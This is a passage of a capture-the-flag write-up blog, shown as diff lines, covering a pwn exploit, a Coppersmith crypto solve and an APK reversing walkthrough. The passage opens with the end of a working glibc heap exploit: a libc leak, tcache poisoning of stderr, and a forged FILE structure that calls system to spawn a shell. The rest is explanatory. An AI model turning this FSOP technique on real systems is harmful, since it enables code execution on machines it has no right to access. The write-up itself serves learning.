+</span>    <span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="s">'0x'</span> <span class="o">+</span> <span class="n">clean_up</span><span class="p">(</span><span class="n">read</span><span class="p">(</span><span class="mi">6</span><span class="p">)),</span> <span class="mi">16</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x1e7b00</span>
+    <span class="k">print</span><span class="p">(</span><span class="s">'libc base leak &gt; '</span><span class="p">,</span> <span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">address</span><span class="p">))</span>
+    <span class="c1"># end leak nonsense
+</span>   
+    <span class="c1"># begin UAF
+</span>    <span class="n">malloc</span><span class="p">(</span><span class="mh">0x300</span><span class="p">,</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">)</span> <span class="c1"># 7
+</span>    <span class="n">malloc</span><span class="p">(</span><span class="mh">0x300</span><span class="p">,</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">)</span> <span class="c1"># 8
+</span>    <span class="n">uaf_free</span><span class="p">(</span><span class="mi">7</span><span class="p">)</span>
+    <span class="n">uaf_free</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span>
+    <span class="n">trigger_uaf_free</span><span class="p">()</span>
+    <span class="c1"># tcache poison to overwrite fd ptr with address to stderr
+</span>    
+    <span class="n">stderr_addr</span> <span class="o">=</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">_IO_2_1_stderr_</span>
+    <span class="k">print</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">stderr_addr</span><span class="p">))</span>
+    <span class="n">modify</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">stderr_addr</span> <span class="o">^</span> <span class="p">(</span><span class="n">ptr_mangle</span><span class="o">+</span><span class="mh">0x2</span><span class="p">)</span> <span class="p">))</span>
+    
+    <span class="n">malloc</span><span class="p">(</span><span class="mh">0x300</span><span class="p">,</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">)</span> <span class="c1"># 9
+</span>    <span class="nb">input</span><span class="p">(</span><span class="s">'... check bins here &gt;'</span><span class="p">)</span>
+    <span class="n">malloc</span><span class="p">(</span><span class="mh">0x300</span><span class="p">,</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">)</span> <span class="c1"># 10
+</span>
+    <span class="c1"># thank you lam junrong
+</span>    
+    <span class="n">fs</span> <span class="o">=</span> <span class="n">FileStructure</span><span class="p">()</span>
+    <span class="n">fs</span><span class="p">.</span><span class="n">flags</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="s">"  "</span> <span class="o">+</span> <span class="s">"sh"</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">6</span><span class="p">,</span> <span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="p">))</span>
+    <span class="n">fs</span><span class="p">.</span><span class="n">_IO_write_base</span> <span class="o">=</span> <span class="mi">0</span>
+    <span class="n">fs</span><span class="p">.</span><span class="n">_IO_write_ptr</span> <span class="o">=</span> <span class="mi">1</span>
+    <span class="n">fs</span><span class="p">.</span><span class="n">_lock</span> <span class="o">=</span> <span class="n">stderr_addr</span><span class="o">-</span><span class="mh">0x10</span> <span class="c1"># Should be null
+</span>    <span class="n">fs</span><span class="p">.</span><span class="n">chain</span> <span class="o">=</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">system</span>
+    <span class="n">fs</span><span class="p">.</span><span class="n">_codecvt</span> <span class="o">=</span> <span class="n">stderr_addr</span>
+    <span class="n">fs</span><span class="p">.</span><span class="n">_wide_data</span> <span class="o">=</span> <span class="n">stderr_addr</span> <span class="o">-</span> <span class="mh">0x48</span>
+    <span class="n">fs</span><span class="p">.</span><span class="n">vtable</span> <span class="o">=</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">_IO_wfile_jumps</span>
+   
+    <span class="n">modify</span><span class="p">(</span><span class="mi">10</span><span class="p">,</span> <span class="nb">bytes</span><span class="p">(</span><span class="n">fs</span><span class="p">))</span>
+    <span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
+    <span class="n">main</span><span class="p">()</span>
+</code></pre></div></div>
+
+<h3 id="day-11-cryptosmall-and-simple-things">day 11: crypto/small and simple things</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>I heard there is a function somewhere to find small roots...
+
+Difficulty: Hard
+
+Challenge Author: Ariana
+</code></pre></div></div>
+
+<p><em>time to solve: 10min</em></p>
+
+<p>when i saw ariana was writing crypto for this i was genuinely quite scared, started worrying about whether i would need to finally properly learn lattices / p-adics but thankfully she threw a softball.</p>
+
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">flag</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="nb">input</span><span class="p">(</span><span class="s">"Enter flag: "</span><span class="p">).</span><span class="n">encode</span><span class="p">().</span><span class="nb">hex</span><span class="p">(),</span><span class="mi">16</span><span class="p">)</span>
+
+<span class="n">N</span> <span class="o">=</span> <span class="p">...</span>
+<span class="n">c</span> <span class="o">=</span> <span class="p">[...,</span> <span class="p">...,</span> <span class="p">...,</span> <span class="p">...]</span>
+<span class="n">enc</span> <span class="o">=</span> <span class="nb">sum</span><span class="p">(</span><span class="n">i</span><span class="o">*</span><span class="nb">pow</span><span class="p">(</span><span class="n">flag</span><span class="p">,</span><span class="n">n</span><span class="p">,</span><span class="n">N</span><span class="p">)</span> <span class="k">for</span> <span class="n">n</span><span class="p">,</span><span class="n">i</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">c</span><span class="p">))</span><span class="o">%</span><span class="n">N</span>
+
+<span class="k">if</span> <span class="n">enc</span> <span class="o">==</span> <span class="p">...:</span>
+    <span class="k">print</span><span class="p">(</span><span class="s">"Congrats! You got the right flag"</span><span class="p">)</span>
+<span class="k">else</span><span class="p">:</span>
+    <span class="k">print</span><span class="p">(</span><span class="s">"Try again"</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>(values have been omitted for brevity.) the challenge essentially gives you a cubic polynomial mod <code class="language-plaintext highlighter-rouge">N</code> and asks you to find the value that results in a certain number, so in essence:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">f</span><span class="p">(</span><span class="n">x</span><span class="p">)</span> <span class="o">=</span> <span class="n">ax</span><span class="o">^</span><span class="mi">3</span> <span class="o">+</span> <span class="n">bx</span><span class="o">^</span><span class="mi">2</span> <span class="o">+</span> <span class="n">cx</span><span class="o">^</span><span class="mi">2</span> <span class="o">+</span> <span class="n">d</span> <span class="n">mod</span> <span class="n">N</span>
+<span class="n">find</span> <span class="n">a</span> <span class="n">such</span> <span class="n">that</span> <span class="n">f</span><span class="p">(</span><span class="n">a</span><span class="p">)</span> <span class="o">=</span> <span class="n">g</span>
+</code></pre></div></div>
+
+<p>where every constant is known. we can just trivially use coppersmith’s method, implemented in sage w/ the <code class="language-plaintext highlighter-rouge">.small_roots()</code> method.</p>
+
+<p>a few stumbling blocks is that <code class="language-plaintext highlighter-rouge">small_roots()</code> requires a monic polynomial, and that you’ll need to adjust the epsilon value in order to actually find the small root. but aside from that, it’s all smooth sailing. solve script:</p>
+
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">F</span> <span class="o">=</span> <span class="n">Zmod</span><span class="p">(</span><span class="n">N</span><span class="p">)</span>
+<span class="n">R</span><span class="p">.</span><span class="o">&lt;</span><span class="n">x</span><span class="o">&gt;</span> <span class="o">=</span> <span class="n">PolynomialRing</span><span class="p">(</span><span class="n">F</span><span class="p">)</span>
+<span class="n">f</span> <span class="o">=</span> <span class="n">c</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="n">c</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">*</span><span class="n">x</span> <span class="o">+</span> <span class="n">c</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span><span class="o">*</span><span class="n">x</span><span class="o">**</span><span class="mi">2</span> <span class="o">+</span> <span class="n">c</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span><span class="o">*</span><span class="n">x</span><span class="o">**</span><span class="mi">3</span> <span class="o">-</span> <span class="n">expected_value</span>
+<span class="n">y</span> <span class="o">=</span> <span class="n">f</span><span class="p">.</span><span class="n">monic</span><span class="p">()</span>
+<span class="n">flag</span> <span class="o">=</span> <span class="n">y</span><span class="p">.</span><span class="n">small_roots</span><span class="p">(</span><span class="n">epsilon</span><span class="o">=</span><span class="mf">0.03</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
+<span class="k">print</span><span class="p">(</span><span class="nb">bytes</span><span class="p">.</span><span class="n">fromhex</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">flag</span><span class="p">)[</span><span class="mi">2</span><span class="p">:]))</span>
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>(sage) navi@curette (/ctf-work/starlabs/day-11) &gt; sage chal.sage
+b'HEX{sagemath_is_a_wonderful_and_magical_world}'
+</code></pre></div></div>
+
+<p><em>a brief explanation of coppersmith’s method:</em></p>
+
+<p>polynomials are generally pretty easy to solve if they’re over the integers (i.e. there’s no ugly <em>mod</em> complicating things). we can solve quadratics trivially using the quadratic formula, cubics w/ the cubic formula, so on and so forth. even for more complicated polynomials we have a lot of simple numeric methods to find values where <code class="language-plaintext highlighter-rouge">f(x) = 0</code>. it’s a solved problem!</p>
+
+<p>coppersmith’s method essentially creates a polynomial w/ small coefficients out of a polynomial w large coefficients. if we define the polynomial as <code class="language-plaintext highlighter-rouge">f(x) mod n</code>, the goal is to make our new polynomial <code class="language-plaintext highlighter-rouge">g</code> with sufficiently small terms <em>such that</em> the <code class="language-plaintext highlighter-rouge">mod n</code> term is entirely irrelevant (there is no ‘wrapping around’). this converts the problem into a numerical one, which we have easy methods to solve.</p>
+
+<p>the exact method by which coppersmith does this is complex (lattice reduction) but essentially it breaks the polynomial down into constituent parts, and then finds a small linear combination of those constituent parts. the key thing to consider here is that the smaller constituent polynomials <em>also</em> have our shared root of interest (they are constructed in such a way that ensures this root remains), so any linear combination of those constituent polynomials will <em>also</em> retain the same root.</p>
+
+<p>essentially, we are compressing a large polynomial into a smaller polynomial using lattices.</p>
+
+<h3 id="day-12-revchristmas-lottery">day 12: rev/christmas lottery</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Can you find Santa's winning lottery ticket?
+
+Difficulty: Hard
+
+Challenge Author: kestryix
+</code></pre></div></div>
+
+<p><em>time to solve: 10 minutes</em></p>
+
+<p>i wouldn’t consider myself good at rev but it’s something i’ve been practicing a lot as of late, so i was honestly hoping for something harder! but the challenge was a lot of fun anyway :^).</p>
+
+<p>the dist is an .apk file, which is a packaged android application.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">navi</span><span class="err">@</span><span class="n">curette</span> <span class="p">(</span><span class="o">/</span><span class="n">ctf</span><span class="o">-</span><span class="n">work</span><span class="o">/</span><span class="n">starlabs</span><span class="o">/</span><span class="n">day</span><span class="o">-</span><span class="mi">12</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">file</span> <span class="n">christmas</span><span class="o">-</span><span class="n">lottery</span><span class="p">.</span><span class="n">apk</span> 
+<span class="n">christmas</span><span class="o">-</span><span class="n">lottery</span><span class="p">.</span><span class="n">apk</span><span class="o">:</span> <span class="n">Android</span> <span class="n">package</span> <span class="p">(</span><span class="n">APK</span><span class="p">),</span> <span class="n">with</span> <span class="n">gradle</span> <span class="n">app</span><span class="o">-</span><span class="n">metadata</span><span class="p">.</span><span class="n">properties</span><span class="p">,</span> <span class="n">with</span> <span class="n">APK</span> <span class="n">Signing</span> <span class="n">Block</span>
+</code></pre></div></div>
+
+<p>for .apks we can basically recover the <em>entire</em> source code just by using <a href="https://github.com/skylot/jadx">jadx</a>, which unpacks the .apk and reveals all the Java source underneath.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">navi</span><span class="err">@</span><span class="n">curette</span> <span class="p">(</span><span class="o">/</span><span class="n">ctf</span><span class="o">-</span><span class="n">work</span><span class="o">/</span><span class="n">starlabs</span><span class="o">/</span><span class="n">day</span><span class="o">-</span><span class="mi">12</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">jadx</span> <span class="o">-</span><span class="n">d</span> <span class="n">out</span><span class="o">/</span> <span class="n">christmas</span><span class="o">-</span><span class="n">lottery</span><span class="p">.</span><span class="n">apk</span>
+<span class="n">INFO</span>  <span class="o">-</span> <span class="n">loading</span> <span class="p">...</span>
+<span class="n">INFO</span>  <span class="o">-</span> <span class="n">processing</span> <span class="p">...</span>
+<span class="n">ERROR</span> <span class="o">-</span> <span class="n">finished</span> <span class="n">with</span> <span class="n">errors</span><span class="p">,</span> <span class="n">count</span><span class="o">:</span> <span class="mi">4</span>
+</code></pre></div></div>
+
+<p>there’s a lot of ugly stuff in this apk but we’ll just go to the entry point, located in <code class="language-plaintext highlighter-rouge">com/christmas/lottery/</code>.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">navi</span><span class="err">@</span><span class="n">curette</span> <span class="p">(</span><span class="n">ces</span><span class="o">/</span><span class="n">com</span><span class="o">/</span><span class="n">christmas</span><span class="o">/</span><span class="n">lottery</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">ls</span>
+<span class="n">ChristmasLotteryApp</span><span class="p">.</span><span class="n">java</span>  <span class="n">MainActivity</span><span class="p">.</span><span class="n">java</span>  <span class="n">R</span><span class="p">.</span><span class="n">java</span>
+                                                                                                                              
+<span class="n">navi</span><span class="err">@</span><span class="n">curette</span> <span class="p">(</span><span class="n">ces</span><span class="o">/</span><span class="n">com</span><span class="o">/</span><span class="n">christmas</span><span class="o">/</span><span class="n">lottery</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">pwd</span>            
+<span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">navi</span><span class="o">/</span><span class="n">ctf</span><span class="o">-</span><span class="n">work</span><span class="o">/</span><span class="n">starlabs</span><span class="o">/</span><span class="n">day</span><span class="o">-</span><span class="mi">12</span><span class="o">/</span><span class="n">out</span><span class="o">/</span><span class="n">sources</span><span class="o">/</span><span class="n">com</span><span class="o">/</span><span class="n">christmas</span><span class="o">/</span><span class="n">lottery</span>
+</code></pre></div></div>
+
+<p>a good trick to find relevant source code in a large application with a bunch of nonsense is to just recursive grep for strings like <code class="language-plaintext highlighter-rouge">flag</code>, it works really well here, as shown</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">navi</span><span class="err">@</span><span class="n">curette</span> <span class="p">(</span><span class="o">-</span><span class="n">work</span><span class="o">/</span><span class="n">starlabs</span><span class="o">/</span><span class="n">day</span><span class="o">-</span><span class="mi">12</span><span class="o">/</span><span class="n">out</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">grep</span> <span class="o">-</span><span class="n">R</span> <span class="err">'</span><span class="n">flag</span><span class="err">'</span><span class="p">.</span>    
+<span class="n">resources</span><span class="o">/</span><span class="n">res</span><span class="o">/</span><span class="n">values</span><span class="o">/</span><span class="n">attrs</span><span class="p">.</span><span class="n">xml</span><span class="o">:</span>        <span class="o">&lt;</span><span class="n">flag</span> <span class="n">name</span><span class="o">=</span><span class="s">"?0x7f080003"</span> <span class="n">value</span><span class="o">=</span><span class="s">"0x10000"</span> <span class="o">/&gt;</span>
+<span class="p">...</span>
+<span class="n">resources</span><span class="o">/</span><span class="n">res</span><span class="o">/</span><span class="n">values</span><span class="o">/</span><span class="n">attrs</span><span class="p">.</span><span class="n">xml</span><span class="o">:</span>        <span class="o">&lt;</span><span class="n">flag</span> <span class="n">name</span><span class="o">=</span><span class="s">"end"</span> <span class="n">value</span><span class="o">=</span><span class="s">"4"</span> <span class="o">/&gt;</span>
+<span class="n">sources</span><span class="o">/</span><span class="n">com</span><span class="o">/</span><span class="n">christmas</span><span class="o">/</span><span class="n">lottery</span><span class="o">/</span><span class="n">MainActivity</span><span class="p">.</span><span class="n">java</span><span class="o">:</span>            <span class="k">if</span> <span class="p">(</span><span class="mi">200</span> <span class="o">&gt;</span> <span class="n">i3</span> <span class="o">||</span> <span class="n">i3</span> <span class="o">&gt;=</span> <span class="mi">300</span> <span class="o">||</span> <span class="o">!</span><span class="n">jSONObject</span><span class="p">.</span><span class="n">has</span><span class="p">(</span><span class="s">"flag"</span><span class="p">))</span> <span class="p">{</span>
+<span class="n">sources</span><span class="o">/</span><span class="n">com</span><span class="o">/</span><span class="n">christmas</span><span class="o">/</span><span class="n">lottery</span><span class="o">/</span><span class="n">MainActivity</span><span class="p">.</span><span class="n">java</span><span class="o">:</span>            <span class="n">Toast</span><span class="p">.</span><span class="n">makeText</span><span class="p">(</span><span class="n">this</span><span class="p">,</span> <span class="s">"Valid ticket! Flag: "</span> <span class="o">+</span> <span class="n">jSONObject</span><span class="p">.</span><span class="n">getStrin</span><span class="p">;</span>
+<span class="n">sources</span><span class="o">/</span><span class="n">com</span><span class="o">/</span><span class="n">google</span><span class="o">/</span><span class="n">android</span><span class="o">/</span><span class="n">gms</span><span class="o">/</span><span class="n">internal</span><span class="o">/</span><span class="n">auth</span><span class="o">/</span><span class="n">zzcq</span><span class="p">.</span><span class="n">java</span><span class="o">:</span>                        <span class="k">if</span> <span class="p">((</span><span class="n">context</span><span class="p">.</span><span class="n">getPackageManager</span><span class="p">().</span><span class="n">getApplicatio</span><span class="p">{</span>
+<span class="p">...</span>
+</code></pre></div></div>
+
+<p>aside from a lot of nonsense we can cut to the important parts of our application quite easily - as we can see, <code class="language-plaintext highlighter-rouge">MainActivity.java</code> has a lot of references to the flag, as well as some references to a ticket validation mechanism. let’s inspect that.</p>
+
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">public</span> <span class="kt">void</span> <span class="nf">handleValidateResponse</span><span class="o">(</span><span class="no">B</span> <span class="n">b3</span><span class="o">,</span> <span class="nc">JSONObject</span> <span class="n">jSONObject</span><span class="o">)</span> <span class="o">{</span>
+    <span class="k">try</span> <span class="o">{</span>
+        <span class="kt">int</span> <span class="n">i3</span> <span class="o">=</span> <span class="n">b3</span><span class="o">.</span><span class="na">f927d</span><span class="o">;</span>
+        <span class="k">if</span> <span class="o">(</span><span class="mi">200</span> <span class="o">&gt;</span> <span class="n">i3</span> <span class="o">||</span> <span class="n">i3</span> <span class="o">&gt;=</span> <span class="mi">300</span> <span class="o">||</span> <span class="o">!</span><span class="n">jSONObject</span><span class="o">.</span><span class="na">has</span><span class="o">(</span><span class="s">"flag"</span><span class="o">))</span> <span class="o">{</span>
+            <span class="nc">Toast</span><span class="o">.</span><span class="na">makeText</span><span class="o">(</span><span class="k">this</span><span class="o">,</span> <span class="n">jSONObject</span><span class="o">.</span><span class="na">optString</span><span class="o">(</span><span class="s">"error"</span><span class="o">,</span> <span class="s">"Invalid ticket code"</span><span class="o">),</span> <span class="mi">0</span><span class="o">).</span><span class="na">show</span><span class="o">();</span>
+            <span class="k">return</span><span class="o">;</span>
+        <span class="o">}</span>
+        <span class="nc">Toast</span><span class="o">.</span><span class="na">makeText</span><span class="o">(</span><span class="k">this</span><span class="o">,</span> <span class="s">"Valid ticket! Flag: "</span> <span class="o">+</span> <span class="n">jSONObject</span><span class="o">.</span><span class="na">getString</span><span class="o">(</span><span class="s">"flag"</span><span class="o">),</span> <span class="mi">1</span><span class="o">).</span><span class="na">show</span><span class="o">();</span>
+    <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="nc">JSONException</span> <span class="n">e3</span><span class="o">)</span> <span class="o">{</span>
+        <span class="k">throw</span> <span class="k">new</span> <span class="nf">RuntimeException</span><span class="o">(</span><span class="n">e3</span><span class="o">);</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</code></pre></div></div>
+
+<p><code class="language-plaintext highlighter-rouge">handleValidateResponse</code> receives some JSON object that already has the flag in it, so this isn’t actually performing any relevant flag computation. onto another function in the same file:</p>
+
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">public</span> <span class="kt">void</span> <span class="nf">signInAnonymouslyAndInitSeed</span><span class="o">()</span> <span class="o">{</span>
+    <span class="nc">Task</span><span class="o">&lt;</span><span class="nc">Object</span><span class="o">&gt;</span> <span class="n">taskZza</span><span class="o">;</span>
+    <span class="k">this</span><span class="o">.</span><span class="na">mAuth</span><span class="o">.</span><span class="na">a</span><span class="o">();</span>
+    <span class="nc">FirebaseAuth</span> <span class="n">firebaseAuth</span> <span class="o">=</span> <span class="k">this</span><span class="o">.</span><span class="na">mAuth</span><span class="o">;</span>
+    <span class="nc">AbstractC0365l</span> <span class="n">abstractC0365l</span> <span class="o">=</span> <span class="n">firebaseAuth</span><span class="o">.</span><span class="na">f2530f</span><span class="o">;</span>
+    <span class="k">if</span> <span class="o">(</span><span class="n">abstractC0365l</span> <span class="o">==</span> <span class="kc">null</span> <span class="o">||</span> <span class="o">!</span><span class="n">abstractC0365l</span><span class="o">.</span><span class="na">c</span><span class="o">())</span> <span class="o">{</span>
+        <span class="n">taskZza</span> <span class="o">=</span> <span class="n">firebaseAuth</span><span class="o">.</span><span class="na">f2529e</span><span class="o">.</span><span class="na">zza</span><span class="o">(</span><span class="n">firebaseAuth</span><span class="o">.</span><span class="na">f2525a</span><span class="o">,</span> <span class="k">new</span> <span class="nc">C0359f</span><span class="o">(</span><span class="n">firebaseAuth</span><span class="o">),</span> <span class="n">firebaseAuth</span><span class="o">.</span><span class="na">f2533i</span><span class="o">);</span>
+    <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
+        <span class="nc">C0384c</span> <span class="n">c0384c</span> <span class="o">=</span> <span class="o">(</span><span class="nc">C0384c</span><span class="o">)</span> <span class="n">firebaseAuth</span><span class="o">.</span><span class="na">f2530f</span><span class="o">;</span>
+        <span class="n">c0384c</span><span class="o">.</span><span class="na">f3844m</span> <span class="o">=</span> <span class="kc">false</span><span class="o">;</span>
+        <span class="n">taskZza</span> <span class="o">=</span> <span class="nc">Tasks</span><span class="o">.</span><span class="na">forResult</span><span class="o">(</span><span class="k">new</span> <span class="no">F</span><span class="o">(</span><span class="n">c0384c</span><span class="o">));</span>
+    <span class="o">}</span>
+    <span class="n">taskZza</span><span class="o">.</span><span class="na">addOnCompleteListener</span><span class="o">(</span><span class="k">this</span><span class="o">,</span> <span class="k">new</span> <span class="n">q</span><span class="o">(</span><span class="k">this</span><span class="o">,</span> <span class="mi">15</span><span class="o">));</span>
+<span class="o">}</span>
+</code></pre></div></div>
+
+<p>this <code class="language-plaintext highlighter-rouge">signInAnonymouslyAndInitSeed</code> function makes some references to a remote Firebase database - Firebase is a Google provided database that mobile / web developers typically use so that they don’t have to set up their own database. i personally have very little experience w/ Firebase and can’t elaborate further than that, but from here we can tell that there is some sort of interaction with a remote database.</p>
+
+<p>let’s try to find more details about the database by looking at another function, <code class="language-plaintext highlighter-rouge">requestSeedFromBackend:</code></p>
+
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">public</span> <span class="kt">void</span> <span class="nf">requestSeedFromBackend</span><span class="o">(</span><span class="nc">String</span> <span class="n">str</span><span class="o">)</span> <span class="o">{</span>
+  <span class="k">this</span><span class="o">.</span><span class="na">executorService</span><span class="o">.</span><span class="na">execute</span><span class="o">(</span><span class="k">new</span> <span class="nc">RunnableC0314k</span><span class="o">(</span><span class="mi">8</span><span class="o">,</span> <span class="k">this</span><span class="o">,</span> <span class="n">str</span><span class="o">));</span>
+<span class="o">}</span>
+</code></pre></div></div>
+
+<p><code class="language-plaintext highlighter-rouge">RunnableC0314k</code> is another import from.. somewhere. we just do the recursive grep trick again to find it, in <code class="language-plaintext highlighter-rouge">sources/i/RunnableC0314k.java</code>.</p>
+
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">navi</span><span class="nd">@curette</span> <span class="o">(-</span><span class="n">work</span><span class="o">/</span><span class="n">starlabs</span><span class="o">/</span><span class="n">day</span><span class="o">-</span><span class="mi">12</span><span class="o">/</span><span class="n">out</span><span class="o">)</span> <span class="o">&gt;</span> <span class="n">grep</span> <span class="o">-</span><span class="no">R</span> <span class="err">'</span><span class="nc">RunnableC0314k</span><span class="err">'</span> <span class="o">.</span>
+<span class="o">./</span><span class="n">sources</span><span class="o">/</span><span class="no">T1</span><span class="o">/</span><span class="n">i</span><span class="o">.</span><span class="na">java</span><span class="o">:</span><span class="kn">import</span> <span class="nn">i.RunnableC0314k</span><span class="o">;</span>
+<span class="o">./</span><span class="n">sources</span><span class="o">/</span><span class="no">T1</span><span class="o">/</span><span class="n">i</span><span class="o">.</span><span class="na">java</span><span class="o">:</span>        <span class="k">this</span><span class="o">.</span><span class="na">f673c</span><span class="o">.</span><span class="na">H</span><span class="o">(</span><span class="k">this</span><span class="o">,</span> <span class="k">new</span> <span class="nc">RunnableC0314k</span><span class="o">(</span><span class="mi">14</span><span class="o">,</span> <span class="k">this</span><span class="o">,</span> <span class="n">runnableJ</span><span class="o">));</span>
+<span class="o">./</span><span class="n">sources</span><span class="o">/</span><span class="no">S</span><span class="o">/</span><span class="n">a</span><span class="o">.</span><span class="na">java</span><span class="o">:</span><span class="kn">import</span> <span class="nn">i.RunnableC0314k</span><span class="o">;</span>
+<span class="o">./</span><span class="n">sources</span><span class="o">/</span><span class="no">S</span><span class="o">/</span><span class="n">a</span><span class="o">.</span><span class="na">java</span><span class="o">:</span>                <span class="o">((</span><span class="nc">MainActivity</span><span class="o">)</span> <span class="o">((</span><span class="no">C0291B</span><span class="o">)</span> <span class="o">((</span><span class="nc">RunnableC0314k</span><span class="o">)</span> <span class="n">obj</span><span class="o">).</span><span class="na">f3546c</span><span class="o">).</span><span class="na">f3353c</span><span class="o">).</span><span class="na">handleValidateResponse</span><span class="o">((</span><span class="no">B</span><span class="o">)</span> <span class="n">obj3</span><span class="o">,</span> <span class="o">(</span><span class="nc">JSONObject</span><span class="o">)</span> <span class="n">obj2</span><span class="o">);</span>
+<span class="o">./</span><span class="n">sources</span><span class="o">/</span><span class="n">com</span><span class="o">/</span><span class="n">christmas</span><span class="o">/</span><span class="n">lottery</span><span class="o">/</span><span class="nc">MainActivity</span><span class="o">.</span><span class="na">java</span><span class="o">:</span><span class="kn">import</span> <span class="nn">i.RunnableC0314k</span><span class="o">;</span>
+<span class="o">./</span><span class="n">sources</span><span class="o">/</span><span class="n">com</span><span class="o">/</span><span class="n">christmas</span><span class="o">/</span><span class="n">lottery</span><span class="o">/</span><span class="nc">MainActivity</span><span class="o">.</span><span class="na">java</span><span class="o">:</span>        <span class="k">this</span><span class="o">.</span><span class="na">executorService</span><span class="o">.</span><span class="na">execute</span><span class="o">(</span><span class="k">new</span> <span class="nc">RunnableC0314k</span><span class="o">(</span><span class="mi">8</span><span class="o">,</span> <span class="k">this</span><span class="o">,</span> <span class="n">str</span><span class="o">));</span>
+<span class="o">./</span><span class="n">sources</span><span class="o">/</span><span class="n">com</span><span class="o">/</span><span class="n">google</span><span class="o">/</span><span class="n">firebase</span><span class="o">/</span><span class="n">auth</span><span class="o">/</span><span class="nc">FirebaseAuth</span><span class="o">.</span><span class="na">java</span><span class="o">:</span><span class="kn">import</span> <span class="nn">i.RunnableC0314k</span><span class="o">;</span>
+<span class="o">./</span><span class="n">sources</span><span class="o">/</span><span class="n">com</span><span class="o">/</span><span class="n">google</span><span class="o">/</span><span class="n">firebase</span><span class="o">/</span><span class="n">auth</span><span class="o">/</span><span class="nc">FirebaseAuth</span><span class="o">.</span><span class="na">java</span><span class="o">:</span>        <span class="n">firebaseAuth</span><span class="o">.</span><span class="na">f2543t</span><span class="o">.</span><span class="na">execute</span><span class="o">(</span><span class="k">new</span> <span class="nc">RunnableC0314k</span><span class="o">(</span><span class="n">firebaseAuth</span><span class="o">,</span> <span class="n">bVar</span><span class="o">,</span> <span class="mi">11</span><span class="o">));</span>
+<span class="o">./</span><span class="n">sources</span><span class="o">/</span><span class="n">i</span><span class="o">/</span><span class="nc">C0320n</span><span class="o">.</span><span class="na">java</span><span class="o">:</span>    <span class="kd">public</span> <span class="nc">RunnableC0314k</span> <span class="n">f3573x</span><span class="o">;</span>
+<span class="o">./</span><span class="n">sources</span><span class="o">/</span><span class="n">i</span><span class="o">/</span><span class="nc">C0320n</span><span class="o">.</span><span class="na">java</span><span class="o">:</span>        <span class="nc">RunnableC0314k</span> <span class="n">runnableC0314k</span> <span class="o">=</span> <span class="k">this</span><span class="o">.</span><span class="na">f3573x</span><span class="o">;</span>
